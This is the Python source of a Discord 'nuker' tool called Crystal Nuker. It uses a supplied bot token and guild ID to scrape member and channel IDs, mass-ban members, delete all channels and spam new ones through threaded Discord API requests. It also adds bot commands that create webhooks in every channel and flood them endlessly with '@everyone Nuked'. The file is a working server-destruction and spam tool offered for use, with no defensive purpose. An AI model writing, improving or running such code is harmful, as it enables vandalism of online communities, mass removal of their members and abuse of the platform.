import os                                                                                                                                                                            #
import random
import json
import time, threading, requests, discord

from discord import SyncWebhook
from colorama import Fore; from pystyle import *; from discord.ext import commands

os.system("clear")
os.system("title Config [ Token ]")
token = input(f"{Fore.MAGENTA}[?] Token : {Fore.WHITE}")
g = input(f"{Fore.MAGENTA}[?] Guild ID : {Fore.WHITE}")

os.system("title Crystal Nuker [Krizz#0000]")
headers = {"Authorization": f"Bot {token}"}
os.system("clear")
crystal = commands.Bot(command_prefix=".", intents=discord.Intents.all())

class CrystalNuker:



    def main():
        os.system("clear")
        
        ch = input(f"""
      {Fore.MAGENTA}╔═╗{Fore.WHITE}┬─┐┬ ┬┌─┐┌┬┐┌─┐┬  
      {Fore.MAGENTA}║{Fore.WHITE}  ├┬┘└┬┘└─┐ │ ├─┤│  
      {Fore.MAGENTA}╚═╝{Fore.WHITE}┴└─ ┴ └─┘ ┴ ┴ ┴┴─┘

               {Fore.MAGENTA}[{Fore.WHITE}0{Fore.MAGENTA}] {Fore.WHITE}Scrape Guild
               {Fore.MAGENTA}[{Fore.WHITE}1{Fore.MAGENTA}] {Fore.WHITE}Ban Members
               {Fore.MAGENTA}[{Fore.WHITE}2{Fore.MAGENTA}] {Fore.WHITE}Delete Channels
               {Fore.MAGENTA}[{Fore.WHITE}3{Fore.MAGENTA}] {Fore.WHITE}Make Channels
               

               {Fore.MAGENTA}[{Fore.WHITE}-->{Fore.MAGENTA}] {Fore.WHITE}Choice {Fore.MAGENTA}: {Fore.WHITE}""")

        if ch == "0":
            CrystalNuker.scrape()
        elif ch == "1":
            CrystalNuker.BanMembers_Ex()
        elif ch == "2":
            CrystalNuker.DeleteChannels_Ex()
        elif ch == "3":
            CrystalNuker.SpamChannels_Ex()

    def scrape():
        @crystal.event
        async def on_ready():
            
            guild = crystal.get_guild(int(g))
            
            m = 0
            c = 0
            
            with open("scraped/channels.txt", "w") as f:
                
                for channel in guild.channels:
                    c += 1
                    f.write(f"{channel.id}\n")
                    
            with open("scraped/members.txt", "w") as f:
                
                for member in guild.members:
                    m += 1
                    f.write(f"{member.id}\n")
            
            print(f"""{Fore.MAGENTA}[{Fore.WHITE}!{Fore.MAGENTA}]{Fore.WHITE} Scraped {Fore.MAGENTA}{m} {Fore.WHITE}Members
{Fore.MAGENTA}[{Fore.WHITE}!{Fore.MAGENTA}]{Fore.WHITE} Scraped {Fore.MAGENTA}{c} {Fore.WHITE}Channels""")
            time.sleep(3)
            
            
            CrystalNuker.main()




    def BanMembers(g, m):
        
        #os.system(f"title Crystal Nuker [Banning Member {m}]")
        try:
            resp = requests.put(f"https://discord.com/api/v9/guilds/{g}/bans/{m}", headers=headers)
            
            if resp.status_code in (200,201,204):
                print(f"{Fore.MAGENTA}[+]{Fore.WHITE} Banned Member      {Fore.GREEN}{m}{Fore.WHITE}")
            
            else:
                print(f"{Fore.MAGENTA}[-]{Fore.WHITE} Couldn't Ban Member {Fore.RED}{m}{Fore.WHITE}")
            
          
        except:
            print(f"{Fore.RED}[-] Proxy IP or Request Error ...{Fore.WHITE}")
            
    
    def BanMembers_Ex():
        
        start = time.perf_counter()
        
        with open("scraped.txt", "r") as members:
            
            for member in members:
                threading.Thread(target=CrystalNuker.BanMembers, args=(g,member)).start()
                
        end = time.perf_counter()
        
        print(f"{Fore.MAGENTA}[!] Est. Time Taken : {round(end - start)} Seconds{Fore.WHITE}")
        CrystalNuker.main()
    
    
    
    
    
    def SpamChannels(n):
        
        try:
            resp = requests.post(f"https://discord.com/api/v9/guilds/{g}/channels", headers=headers, json={"name": n, "type": 0})
            
            if resp.status_code in (200,201,204):
                print(f"{Fore.MAGENTA}[+]{Fore.WHITE} Created Channel      {Fore.GREEN}{g}{Fore.WHITE}")
            
            else:
                print(f"{Fore.MAGENTA}[-]{Fore.WHITE} Couldn't Create Channel {Fore.RED}{g}{Fore.WHITE}")

        except:
            print(f"{Fore.RED}[-] Proxy IP or Request Error ...{Fore.WHITE}")
            
            
    def SpamChannels_Ex():
        
        times = input(f"{Fore.MAGENTA}[?] Times : {Fore.WHITE}")
        name = input(f"{Fore.MAGENTA}[?] Name Of The Channel : {Fore.WHITE}")


        start = time.perf_counter()
            
        for _ in range(int(times)):
                threading.Thread(target=CrystalNuker.SpamChannels, args=(name,)).start()
                
        end = time.perf_counter()
        
        print(f"{Fore.MAGENTA}[!] Est. Time Taken : {round(end - start)} Seconds{Fore.WHITE}")
        
        CrystalNuker.main()
        
        
        
        
        
    def DeleteChannels(c):
        
         try:
            resp = requests.delete(f"https://discord.com/api/v9/channels/{c}", headers=headers)
            
            if resp.status_code in (200,201,204):
                print(f"{Fore.MAGENTA}[+]{Fore.WHITE} Deleted Channel      {Fore.GREEN}{c}{Fore.WHITE}")
            
            else:
                print(f"{Fore.MAGENTA}[-]{Fore.WHITE} Couldn't Delete Channel      {Fore.RED}{c}{Fore.WHITE}")

         except:
            print(f"{Fore.RED}[-] Proxy IP or Request Error ...{Fore.WHITE}")
            
            
    def DeleteChannels_Ex():
        
         start = time.perf_counter()
         with open("scraped/channels.txt", "r") as channels:
            
            for c in channels:
                threading.Thread(target=CrystalNuker.DeleteChannels, args=(c,)).start()
                
         end = time.perf_counter()
        
         print(f"{Fore.MAGENTA}[!] Est. Time Taken : {round(end - start)} Seconds{Fore.WHITE}")
         CrystalNuker.main()
        


      
def webhook_spam(w):
   while True:
    web = SyncWebhook.from_url(w)
    web.send(content="@everyone Nuked")
    
@crystal.command()
async def webhook(ctx):
    
    await ctx.message.delete()
    try:
     for channel in ctx.guild.channels:
        await channel.create_webhook(name="Nuked By Crystal Nuker")
    
    except:
        pass

@crystal.command()
async def spam(ctx):
    
      for webhook in await ctx.guild.webhooks():
        threading.Thread(target=webhook_spam, args=(webhook.url,)).start()
        
        
        
        
CrystalNuker.main()
crystal.run(token, log_handler=None)